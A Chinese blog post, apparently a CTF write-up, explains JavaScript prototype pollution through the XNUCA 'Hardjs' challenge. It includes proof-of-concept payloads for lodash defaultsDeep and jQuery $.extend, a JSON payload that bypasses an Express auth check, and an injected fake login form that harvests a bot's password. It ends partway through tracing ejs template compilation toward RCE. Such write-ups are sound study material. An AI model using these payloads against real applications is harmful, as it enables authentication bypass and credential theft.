@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Javascript原型链污染 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-原型链污染" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Javascript原型链污染
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
+  <time datetime="2020-02-25T06:15:25.000Z" itemprop="datePublished">2020-02-25</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>通过几道ctf题学习Javascript 原型链污染 </p>
+<a id="more"></a>
+
+<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><p>javascript原型链污染，网上介绍原理的文章已经很多了，最经典的还是P神分析的那篇<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">文章</a>，这里就不在详细的介绍原理了，简单来说，就是</p>
+<blockquote>
+<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+</blockquote>
+<p>最后上一张图，来更清晰的理解。</p>
+<img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142328583.png" alt="image-20200225142328583" style="zoom:200%;">
+
+<h3 id="XNUCA-Hardjs"><a href="#XNUCA-Hardjs" class="headerlink" title="XNUCA Hardjs"></a>XNUCA Hardjs</h3><p>这道题有很多解，我们可以下到源码，在网页上了解一下大致的功能，可以注册、登录。登录后可以添加一些内容。接下来审计源码，这种有<code>package.json</code>文件的源码，我们可以先用<code>npm  audit</code>命令来检测一下第三方的库有没有漏洞。</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142924459.png" alt="image-20200225142924459"></p>
+<p>可以看到lodash包有原型链污染漏洞。</p>
+<p>找到<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202" target="_blank" rel="noopener">poc</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+
+<p>然后我们审计源码，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">            ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(ret);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在get路由中<code>dataList[0].count &gt; 5</code>时，会进行merge,如果我们可以控制raws[i].dom，我们就可以进行原型链污染，审计源码可以知道raws[i].dom为我们在add路由中输入的数据，那么我们就可以进行原型链污染，然后我们去找可以污染的对象，一般如果看到形如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(aaaaa.xxxx)</span><br><span class="line">&#123;</span><br><span class="line">		..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样的就可以通过原型链污染来进行进一步的利用。</p>
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>题目给的源码中我们可以看见有一个rebot.py，并且其中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>那么，xss一定是出题人留的一条利用链，从rebot.py可以看到，密码就是flag，bot是直接访问的127.0.0.1，然后从响应中提取用户名和密码的输入框，然后输入用户名和密码，登录。这里看上去我们是没办法利用的，但是分析我们可以通过原型链污染来bypass。在前端的代码中，用了3.3.0版本的jquery，jquery的$.extend方法也存在原型链污染漏洞，</p>
+<p>poc:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<p>在前端app.js中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:<span class="string">"/get"</span>,</span><br><span class="line">		type:<span class="string">"get"</span>,</span><br><span class="line">		<span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">		success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">				$.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// console.log(allNode);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了$.extend()方法，</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225145755746.png" alt="image-20200225145755746"></p>
+<p>并且这个getAll会在页面加载的时候执行。并且在加载页面的侯还进行了页面动态渲染，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> hints = &#123;</span><br><span class="line">		header : <span class="string">"自定义内容"</span>,</span><br><span class="line">		notice: <span class="string">"自定义公告"</span>,</span><br><span class="line">		wiki : <span class="string">"自定义wiki"</span>,</span><br><span class="line">		button:<span class="string">"自定义内容"</span>,</span><br><span class="line">		message: <span class="string">"自定义留言内容"</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">		<span class="comment">// console.log(key);</span></span><br><span class="line">		element = $(<span class="string">"li[type='"</span>+key+<span class="string">"']"</span>); </span><br><span class="line">		<span class="keyword">if</span>(element)&#123;</span><br><span class="line">			element.find(<span class="string">"span.content"</span>).html(hints[key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>如果我们可以利用原型链污染在页面加载的时候在页面中插入登录表单并链接到我们的vps,那么我们就可以进行xss,得到flag了。在上面动态渲染的时候，会把hints的键值对渲染到页面，如果我们像要插入东西的话，就必须寻找一个既有type 又有content的标签。logger刚好能满足这个条件。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-g error-log"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"am-list am-in"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">"logger"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 col-sm-centered"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"am-pre-scrollable"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-success"</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-danger"</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们在本地测试一下果然可以。</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225151619001.png" alt>那么我们只要在这里插入一个登录的表单，或者一个表单重定向的链接，就可以进行xss了，但是这里还有一个问题，就是bot默认访问127.0.0.1时进入的时登录界面，不会是我们原型链污染后的界面，所以我们继续看，在server.js中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/"</span>,auth,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>/路由中，如果我们通过了auth函数，就会直接到index的模板中，我们需要绕过这个auth函数，在函数中，开始的时候session是没有login和userid属性的，所以可以利用原型链污染来绕过这里。从而达到我们的利用目的。</p>
+<p>下面是实际操作的步骤</p>
+<p>先注册登录，重复发送6次payload，绕过auth函数。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"test"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"login"</span>:<span class="literal">true</span>,<span class="attr">"userid"</span>:<span class="number">1</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225153310973.png" alt="image-20200225153310973"></p>
+<p>然后我们访问get界面，触发原型链污染，然后清空cookie,仍可访问，说明已经绕过auth函数，接下来插入logger</p>
+<p>,在vps上写好登录框</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">class</span>=<span class="string">"am-form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"remember-me"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"remember-me"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">          记住密码</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-cf"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"登录"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-primary am-btn-sm am-fl"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"location.replace('&lt;%= next %&gt;')"</span> <span class="attr">value</span>=<span class="string">"注册"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-default am-btn-sm am-fr"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后发送payload，等待bot点击，去vps收flag。</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225154218671.png" alt="image-20200225154218671"></p>
+<p>以上是前端加后端的做法。</p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>这道题还有一种后端sys模板rce的方法，由于模板引擎存在变量拼接的过程，所以存在RCE的可能，然后我们跟进res.render()函数去分析，到response.js的render函数</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175640508.png" alt="image-20200225175640508"></p>
+<p>一些merge之后，调用然后跟到app.render()函数，继续跟进</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175813279.png" alt="image-20200225175813279"></p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225175935554.png" alt="image-20200225175935554"></p>
+<p>跟进tryRender()函数</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180110538.png" alt="image-20200225180110538"></p>
+<p>跟到view.js中的render()函数</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180159127.png" alt="image-20200225180159127"></p>
+<p>到engine()函数，又跟到ejs.js的渲染引擎的渲染函数exports.renderFile()</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180528375.png" alt="image-20200225180528375"></p>
+<p>//……………………………………</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225191935895.png" alt="image-20200225191935895"></p>
+<p>这里省略了一些无关的代码。renderFile()函数后面又调用了tryHandleCache()，继续跟进，</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225180656822.png" alt="image-20200225180656822"></p>
+<p>这里又跟进到handleCache()函数</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181034328.png" alt="image-20200225181034328"></p>
+<p>然后跟进exports.compile()函数</p>
+<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225181212417.png" alt="image-20200225181212417"></p>
+<p>这里 new了一个Template，然后调用了其compile()函数，跟进</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="keyword">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">      <span class="keyword">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">'  var __output = [], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== 